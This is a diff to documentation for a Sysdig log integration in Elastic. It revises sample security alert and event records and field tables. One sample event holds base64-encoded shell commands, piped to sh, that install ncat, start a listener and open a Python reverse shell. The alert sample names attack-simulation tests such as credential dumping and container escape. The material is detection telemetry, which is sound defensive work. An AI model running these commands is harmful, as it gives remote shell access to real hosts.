@@ -59,13 +59,13 @@ An example event for `alerts` looks as following:
 
 ```json
 {
-    "@timestamp": "2025-05-15T20:55:10.950Z",
+    "@timestamp": "2025-07-08T13:19:59.855Z",
     "agent": {
-        "ephemeral_id": "d1edefb2-dd7d-40f4-bc12-f3e8e0e8a0c8",
+        "ephemeral_id": "06598217-2eda-4010-b398-c1fac40a3348",
         "id": "58014837",
-        "name": "elastic-agent-68303",
+        "name": "elastic-agent-94970",
         "type": "filebeat",
-        "version": "8.14.1"
+        "version": "8.16.0"
     },
     "cloud": {
         "account": {
@@ -91,23 +91,24 @@ An example event for `alerts` looks as following:
     },
     "data_stream": {
         "dataset": "sysdig.alerts",
-        "namespace": "85290",
+        "namespace": "64449",
         "type": "logs"
     },
     "ecs": {
-        "version": "8.17.0"
+        "version": "8.0.0"
     },
     "elastic_agent": {
-        "id": "e5c61bf4-097f-42fe-90df-25e8ef080bd8",
+        "id": "aaa022b5-44de-4090-a54a-a35ef821ccfc",
         "snapshot": false,
-        "version": "8.14.1"
+        "version": "8.16.0"
     },
     "event": {
         "agent_id_status": "mismatch",
         "dataset": "sysdig.alerts",
         "id": "17dec715376910362c8c3f62a4ceda2e",
-        "ingested": "2025-05-15T20:55:12Z",
+        "ingested": "2025-07-08T13:20:00Z",
         "kind": "alert",
+        "module": "sysdig",
         "provider": "syscall",
         "severity": 7,
         "timezone": "+00:00"
@@ -159,17 +160,23 @@ An example event for `alerts` looks as following:
         "containerId": "6949e5f10829",
         "content": {
             "fields": {
-                "container.name": "threatgen",
-                "proc.cmdline": "userdel tmp_suid_user",
-                "proc.cwd": "/tmp/",
-                "proc.exepath": "/usr/sbin/userdel",
-                "proc.name": "userdel",
-                "proc.pcmdline": "pwsh -c (./RunTests.ps1 STDIN.NETWORK DEV.SHM.EXEC T1048 RECON.FIND.SUID T1611.002 CONTAINER.ESCAPE.NSENTER CREDS.DUMP.MEMORY KILL.MALICIOUS.PROC LOAD.BPF.PROG Base64.PYTHON BASE64.CLI CONNECT.UNEXPECTED RECON.GPG SUBTERFUGE.LASTLOG LD.LINUX.EXEC LD.SO.PRELOAD USERFAULTFD.HANDLER RECON.LINPEAS PROOT.EXEC)",
-                "proc.pid": "2140169",
-                "proc.pname": "pwsh",
-                "proc.ppid": "2140088",
-                "user.name": "root",
-                "user.uid": "0"
+                "container": {
+                    "name": "threatgen"
+                },
+                "proc": {
+                    "cmdline": "userdel tmp_suid_user",
+                    "cwd": "/tmp/",
+                    "exepath": "/usr/sbin/userdel",
+                    "name": "userdel",
+                    "pcmdline": "pwsh -c (./RunTests.ps1 STDIN.NETWORK DEV.SHM.EXEC T1048 RECON.FIND.SUID T1611.002 CONTAINER.ESCAPE.NSENTER CREDS.DUMP.MEMORY KILL.MALICIOUS.PROC LOAD.BPF.PROG Base64.PYTHON BASE64.CLI CONNECT.UNEXPECTED RECON.GPG SUBTERFUGE.LASTLOG LD.LINUX.EXEC LD.SO.PRELOAD USERFAULTFD.HANDLER RECON.LINPEAS PROOT.EXEC)",
+                    "pid": "2140169",
+                    "pname": "pwsh",
+                    "ppid": "2140088"
+                },
+                "user": {
+                    "name": "root",
+                    "uid": "0"
+                }
             },
             "output": "Users management command userdel tmp_suid_user launched by pwsh on threatgen under user root (proc.name=userdel proc.args=tmp_suid_user fd.name=<NA> proc.cmdline=pwsh -c (./RunTests.ps1 STDIN.NETWORK DEV.SHM.EXEC T1048 RECON.FIND.SUID T1611.002 CONTAINER.ESCAPE.NSENTER CREDS.DUMP.MEMORY KILL.MALICIOUS.PROC LOAD.BPF.PROG Base64.PYTHON BASE64.CLI CONNECT.UNEXPECTED RECON.GPG SUBTERFUGE.LASTLOG LD.LINUX.EXEC LD.SO.PRELOAD USERFAULTFD.HANDLER RECON.LINPEAS PROOT.EXEC) proc.pname=pwsh gparent=containerd-shim ggparent=<NA> gggparent=<NA> container=container_id=6949e5f10829 container_name=threatgen evt.type=execve evt.arg.request=<NA> proc.pid=2140169 proc.cwd=/tmp/ proc.ppid=2140088 proc.pcmdline=pwsh -c (./RunTests.ps1 STDIN.NETWORK DEV.SHM.EXEC T1048 RECON.FIND.SUID T1611.002 CONTAINER.ESCAPE.NSENTER CREDS.DUMP.MEMORY KILL.MALICIOUS.PROC LOAD.BPF.PROG Base64.PYTHON BASE64.CLI CONNECT.UNEXPECTED RECON.GPG SUBTERFUGE.LASTLOG LD.LINUX.EXEC LD.SO.PRELOAD USERFAULTFD.HANDLER RECON.LINPEAS PROOT.EXEC) proc.sid=1 proc.exepath=/usr/sbin/userdel user.uid=0 user.loginuid=-1 user.loginname=<NA> user.name=root group.gid=0 group.name=root container.id=6949e5f10829 container.name=threatgen image=docker.io/dockerbadboy/art)",
             "policyOrigin": "Sysdig",
@@ -237,8 +244,7 @@ An example event for `alerts` looks as following:
         "originator": "policy",
         "severity": 7,
         "source": "syscall",
-        "timestamp": 1720031001639981000,
-        "timestampRFC3339Nano": "2024-07-03T18:23:21.63998111Z",
+        "timestampRFC3339Nano": "2024-07-03T18:23:21.639Z",
         "type": "policy"
     },
     "tags": [
@@ -254,9 +260,13 @@ An example event for `alerts` looks as following:
         "MITRE_T1531_account_access_removal",
         "MITRE_T1098_account_manipulation"
     ],
-    "threat.technique.id": [
-        "T1136"
-    ]
+    "threat": {
+        "technique": {
+            "id": [
+                "T1136"
+            ]
+        }
+    }
 }
 ```
 
@@ -264,12 +274,12 @@ An example event for `alerts` looks as following:
 
 | Field | Description | Type |
 |---|---|---|
-| @timestamp | Event timestamp with nanos. | date |
-| data_stream.dataset | Data stream dataset. | constant_keyword |
-| data_stream.namespace | Data stream namespace. | constant_keyword |
-| data_stream.type | Data stream type. | constant_keyword |
-| event.dataset | Data stream / event dataset. | constant_keyword |
-| event.module | The module the event belongs to. | constant_keyword |
+| @timestamp | Date/time when the event originated. This is the date/time extracted from the event, typically representing when the event was generated by the source. If the event source has no original timestamp, this value is typically populated by the first time the event was received by the pipeline. Required field for all events. | date |
+| data_stream.dataset | The field can contain anything that makes sense to signify the source of the data. Examples include `nginx.access`, `prometheus`, `endpoint` etc. For data streams that otherwise fit, but that do not have dataset set we use the value "generic" for the dataset value. `event.dataset` should have the same value as `data_stream.dataset`. Beyond the Elasticsearch data stream naming criteria noted above, the `dataset` value has additional restrictions:   \* Must not contain `-`   \* No longer than 100 characters | constant_keyword |
+| data_stream.namespace | A user defined namespace. Namespaces are useful to allow grouping of data. Many users already organize their indices this way, and the data stream naming scheme now provides this best practice as a default. Many users will populate this field with `default`. If no value is used, it falls back to `default`. Beyond the Elasticsearch index naming criteria noted above, `namespace` value has the additional restrictions:   \* Must not contain `-`   \* No longer than 100 characters | constant_keyword |
+| data_stream.type | An overarching type for the data stream. Currently allowed values are "logs" and "metrics". We expect to also add "traces" and "synthetics" in the near future. | constant_keyword |
+| event.dataset | Name of the dataset. If an event source publishes more than one type of log or events (e.g. access log, error log), the dataset is used to specify which one the event comes from. It's recommended but not required to start the dataset name with the module name, followed by a dot, then the dataset name. | constant_keyword |
+| event.module | Name of the module this data is coming from. If your monitoring agent supports the concept of modules or plugins to process events of a given source (e.g. Apache logs), `event.module` should contain the name of this module. | constant_keyword |
 | input.type |  | constant_keyword |
 | sysdig.actions |  | flattened |
 | sysdig.agentId | Agent identifier | integer |
@@ -294,7 +304,7 @@ An example event for `alerts` looks as following:
 | sysdig.content.ruleTags | Tags associated with an event rule | text |
 | sysdig.content.ruleType | Category of the rule associated with an event | text |
 | sysdig.description | Description of the event policy | text |
-| sysdig.event.category |  | text |
+| sysdig.event.category |  | keyword |
 | sysdig.event.description |  | text |
 | sysdig.event.type |  | text |
 | sysdig.hostMac | MAC address of the host machine | text |
@@ -336,13 +346,13 @@ An example event for `event` looks as following:
 
 ```json
 {
-    "@timestamp": "2025-04-05T03:00:01.1159286Z",
+    "@timestamp": "2025-04-05T03:00:01.115Z",
     "agent": {
-        "ephemeral_id": "9c2740ce-0231-4f1c-9b03-ba17c5430743",
-        "id": "57e0981b-86e9-4bda-a293-dde14ffd115d",
-        "name": "elastic-agent-91842",
+        "ephemeral_id": "630f5fe1-7126-4b08-86a9-6282e4fc2557",
+        "id": "449f372d-5932-43a5-8c0c-21b24174ce6c",
+        "name": "elastic-agent-42491",
         "type": "filebeat",
-        "version": "8.14.1"
+        "version": "8.16.0"
     },
     "cloud": {
         "account": {
@@ -367,16 +377,16 @@ An example event for `event` looks as following:
     },
     "data_stream": {
         "dataset": "sysdig.event",
-        "namespace": "31832",
+        "namespace": "25778",
         "type": "logs"
     },
     "ecs": {
         "version": "8.17.0"
     },
     "elastic_agent": {
-        "id": "57e0981b-86e9-4bda-a293-dde14ffd115d",
+        "id": "449f372d-5932-43a5-8c0c-21b24174ce6c",
         "snapshot": false,
-        "version": "8.14.1"
+        "version": "8.16.0"
     },
     "event": {
         "agent_id_status": "verified",
@@ -385,8 +395,9 @@ An example event for `event` looks as following:
         ],
         "dataset": "sysdig.event",
         "id": "1a334cdef0060123456789abcdef64a9",
-        "ingested": "2025-05-19T08:53:26Z",
+        "ingested": "2025-07-08T13:20:47Z",
         "kind": "event",
+        "module": "sysdig",
         "original": "{\"category\":\"runtime\",\"content\":{\"fields\":{\"container.image.repository\":\"docker.io/library/python\",\"container.name\":\"shell-scripting\",\"evt.res\":\"SUCCESS\",\"evt.type\":\"execve\",\"group.gid\":\"0\",\"group.name\":\"root\",\"proc.args\":\"\",\"proc.cmdline\":\"sh\",\"proc.cwd\":\"/\",\"proc.exepath\":\"/usr/bin/dash\",\"proc.hash.sha256\":\"f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6\",\"proc.name\":\"sh\",\"proc.pcmdline\":\"bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh\",\"proc.pid\":\"1372469\",\"proc.pid.ts\":\"1743822001115100312\",\"proc.pname\":\"bash\",\"proc.ppid\":\"1372453\",\"proc.ppid.ts\":\"1743822000952432134\",\"proc.sid\":\"1\",\"user.loginname\":\"\\u003cNA\\u003e\",\"user.loginuid\":\"-1\",\"user.name\":\"root\",\"user.uid\":\"0\"},\"origin\":\"Secure UI\",\"output\":\"Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pname=bash gparent=runc ggparent=containerd-shim gggparent=systemd image=docker.io/library/python user.uid=0 proc.cmdline=sh proc.pcmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root user.loginuid=-1 proc.args= container.name=shell-scripting evt.type=execve evt.res=SUCCESS proc.pid=1372469 proc.cwd=/ proc.ppid=1372453 proc.sid=1 proc.exepath=/usr/bin/dash user.loginname=\\u003cNA\\u003e group.gid=0 group.name=root proc.pid.ts=1743822001115100312 proc.ppid.ts=1743822000952432134 proc.hash.sha256=f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6)\",\"policyId\":10569534,\"ruleName\":\"My test rule custom\",\"ruleSubType\":0,\"ruleTags\":[\"My-tag-custom-1-hello-world\",\"MITTRE-WHATEVER\"],\"ruleType\":6,\"type\":\"workloadRuntimeDetection\"},\"description\":\"This is just a dumb policy to test custom policies\",\"engine\":\"falco\",\"id\":\"1a334cdef0060123456789abcdef64a9\",\"labels\":{\"cloudProvider.account.id\":\"012345678912\",\"cloudProvider.name\":\"gcp\",\"cloudProvider.region\":\"us-central1\",\"container.image.digest\":\"sha256:aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a\",\"container.image.id\":\"ef0f72a55bd2\",\"container.image.repo\":\"docker.io/library/python\",\"container.image.tag\":\"3.9.18-slim\",\"container.label.io.kubernetes.container.name\":\"shell-scripting\",\"container.label.io.kubernetes.pod.name\":\"shell-scripting-29063700-123ab\",\"container.label.io.kubernetes.pod.namespace\":\"default\",\"container.name\":\"shell-scripting\",\"gcp.location\":\"us-central1\",\"gcp.projectId\":\"012345678912\",\"host.hostName\":\"gke-cluster-gcp-demo-san-default-pool-11234abc-abcd\",\"host.mac\":\"01:00:5e:90:10:00\",\"kubernetes.cluster.name\":\"gke-alliances-demo-6\",\"kubernetes.cronJob.name\":\"shell-scripting\",\"kubernetes.job.name\":\"shell-scripting-29063700\",\"kubernetes.namespace.name\":\"default\",\"kubernetes.node.name\":\"gke-cluster-gcp-demo-san-default-pool-12345678-abcd\",\"kubernetes.pod.name\":\"shell-scripting-12345678-123ab\",\"kubernetes.workload.name\":\"shell-scripting\",\"kubernetes.workload.type\":\"cronjob\"},\"name\":\"Manuel test policy\",\"originator\":\"policy\",\"rawEventCategory\":\"runtime\",\"rawEventOriginator\":\"linuxAgent\",\"severity\":4,\"source\":\"syscall\",\"sourceDetails\":{\"subType\":\"container\",\"type\":\"workload\"},\"timestamp\":1743822001115928600}",
         "outcome": "success",
         "provider": "syscall",
@@ -433,10 +444,10 @@ An example event for `event` looks as following:
             "command_line": "bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh",
             "name": "bash",
             "pid": 1372453,
-            "start": "2025-04-05T03:00:00.952432134Z"
+            "start": "2025-04-05T03:00:00.952Z"
         },
         "pid": 1372469,
-        "start": "2025-04-05T03:00:01.115100312Z",
+        "start": "2025-04-05T03:00:01.115Z",
         "working_directory": "/"
     },
     "related": {
@@ -552,12 +563,12 @@ An example event for `event` looks as following:
 
 | Field | Description | Type |
 |---|---|---|
-| @timestamp | Event timestamp. | date |
-| data_stream.dataset | Data stream dataset. | constant_keyword |
-| data_stream.namespace | Data stream namespace. | constant_keyword |
-| data_stream.type | Data stream type. | constant_keyword |
-| event.dataset | Event dataset. | constant_keyword |
-| event.module | Event module. | constant_keyword |
+| @timestamp | Date/time when the event originated. This is the date/time extracted from the event, typically representing when the event was generated by the source. If the event source has no original timestamp, this value is typically populated by the first time the event was received by the pipeline. Required field for all events. | date |
+| data_stream.dataset | The field can contain anything that makes sense to signify the source of the data. Examples include `nginx.access`, `prometheus`, `endpoint` etc. For data streams that otherwise fit, but that do not have dataset set we use the value "generic" for the dataset value. `event.dataset` should have the same value as `data_stream.dataset`. Beyond the Elasticsearch data stream naming criteria noted above, the `dataset` value has additional restrictions:   \* Must not contain `-`   \* No longer than 100 characters | constant_keyword |
+| data_stream.namespace | A user defined namespace. Namespaces are useful to allow grouping of data. Many users already organize their indices this way, and the data stream naming scheme now provides this best practice as a default. Many users will populate this field with `default`. If no value is used, it falls back to `default`. Beyond the Elasticsearch index naming criteria noted above, `namespace` value has the additional restrictions:   \* Must not contain `-`   \* No longer than 100 characters | constant_keyword |
+| data_stream.type | An overarching type for the data stream. Currently allowed values are "logs" and "metrics". We expect to also add "traces" and "synthetics" in the near future. | constant_keyword |
+| event.dataset | Name of the dataset. If an event source publishes more than one type of log or events (e.g. access log, error log), the dataset is used to specify which one the event comes from. It's recommended but not required to start the dataset name with the module name, followed by a dot, then the dataset name. | constant_keyword |
+| event.module | Name of the module this data is coming from. If your monitoring agent supports the concept of modules or plugins to process events of a given source (e.g. Apache logs), `event.module` should contain the name of this module. | constant_keyword |
 | input.type | Type of filebeat input. | keyword |
 | log.offset | Log offset. | long |
 | sysdig.event.actions.after_event_ns | Duration after the event that the capture spans in nanoseconds. | long |
